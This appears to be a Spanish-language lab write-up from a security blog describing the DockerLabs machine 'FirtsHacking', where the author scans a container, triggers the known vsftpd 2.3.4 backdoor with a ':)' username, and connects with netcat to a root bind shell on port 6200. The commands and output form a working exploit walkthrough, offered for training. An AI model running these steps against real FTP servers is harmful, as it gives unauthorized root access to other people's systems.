@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina FirtsHacking | ZsZsec</title>
+<meta content="Escaneo inicial Iniciamos con un escaneo agresivo de todos los puertos del objetivo: Resultado: Observamos que el puerto 21 está abierto corriendo vsftpd 2.3.4 , una versión conoci..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina FirtsHacking<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / FTP / Netcat</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">FTP</span><span class="tag">Netcat</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h3>Escaneo inicial</h3>
+<p>Iniciamos con un escaneo agresivo de todos los puertos del objetivo:</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Downloads/firsthacking]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 19:43 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000010s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+</code></pre>
+<p>Resultado:</p>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+</code></pre>
+<p>Observamos que el puerto 21 está abierto corriendo <strong>vsftpd 2.3.4</strong>, una versión <strong>conocida por haber sido comprometida con una backdoor en versiones no oficiales</strong>.</p>
+<h3>Análisis de la vulnerabilidad</h3>
+<p>La versión <code>vsftpd 2.3.4</code> fue alterada maliciosamente en 2011, añadiendo una <strong>puerta trasera que se activa cuando se intenta iniciar sesión con un nombre de usuario que contiene la cadena <code>:)</code></strong>.</p>
+<p>Este comportamiento no es parte del FTP original; fue insertado de forma oculta por un atacante en una versión falsa del servidor FTP. Al recibir este "trigger", el demonio vsftpd abre una <strong>shell bind como root en el puerto 6200</strong>.</p>
+<h3>Activación de la backdoor</h3>
+<p>Nos conectamos al servicio FTP e intentamos autenticarnos usando el trigger <code>:)</code>:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~/Downloads/firsthacking]
+└─$ ftp 172.17.0.2 21                                   
+Connected to 172.17.0.2.
+220 (vsFTPd 2.3.4)
+Name (172.17.0.2:zikuta): hola:)
+331 Please specify the password.
+Password: 
+</code></pre>
+<p>Aunque el login falla, el trigger <code>:)</code> <strong>activa la backdoor</strong>. Hacemos un nuevo escaneo:</p>
+<pre><code class="language-bash">                                                                         
+┌──(zikuta㉿zikuta)-[~/Downloads/firsthacking]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 19:32 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.4
+6200/tcp open  lm-x?
+| fingerprint-strings: 
+|   GenericLines: 
+|     sh: 1: 
+|     found
+|_    found
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port6200-TCP:V=7.95%I=7%D=7/8%Time=686DB89E%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,28,"sh:\x201:\x20\r:\x20not\x20found\nsh:\x202:\x20\r:\x20not
+SF:\x20found\n");
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+</code></pre>
+<p>Nuevo resultado:</p>
+<pre><code class="language-bash">6200/tcp open  lm-x?
+</code></pre>
+<p>El puerto 6200 ahora aparece abierto: esto confirma que el trigger funcionó y que la shell está activa.</p>
+<h3>Explotación – Acceso como root</h3>
+<p>Nos conectamos directamente con <code>nc</code>:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~/Downloads/firsthacking]
+└─$ nc 172.17.0.2 6200   
+whoami
+root
+</code></pre>
+<h3>Conclusión</h3>
+<p>Se ha explotado una <strong>backdoor en la versión maliciosa de vsftpd 2.3.4</strong>, activada mediante el trigger <code>:)</code> al intentar iniciar sesión por FTP. Esto nos dio una <strong>shell directa como <code>root</code> a través del puerto 6200</strong>, permitiendo control total sobre el sistema.</p>
+<table>
+<thead>
+<tr>
+<th>Táctica</th>
+<th>Técnica</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td><a href="https://attack.mitre.org/techniques/T1133/">T1133 - External Remote Services</a></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td><a href="https://attack.mitre.org/techniques/T1059/">T1059 - Command and Scripting Interpreter</a></td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td><a href="https://attack.mitre.org/techniques/T1068/">T1068 - Exploitation for Privilege Escalation</a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td><a href="https://attack.mitre.org/techniques/T1071/001/">T1071.001 - Application Layer Protocol: Web Protocols</a></td>
+</tr>
+<tr>
+<td>Persistence (temporal)</td>
+<td>Puerto bind shell abierto mientras no se reinicie el servicio</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
